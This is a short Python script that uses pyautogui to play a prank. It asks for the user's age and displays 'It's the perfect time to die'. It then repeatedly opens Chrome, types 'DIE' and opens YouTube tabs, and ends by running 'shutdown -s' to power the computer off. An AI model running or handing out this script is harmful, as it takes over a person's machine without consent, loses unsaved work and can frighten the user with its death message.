import pyautogui as pg
import os

pg.prompt('Enter your age', 'Your age')
pg.confirm('It\'s the perfect time to die', 'That\'s all', '-')
for i in range(15):
    pg.hotkey("winleft")
    pg.typewrite("chrome\n", 0.3)
    pg.typewrite("DIE\n")
for i in range(15):
    pg.typewrite("youtube.com\n")
    pg.hotkey("ctrl", "t")

os.system('shutdown -s')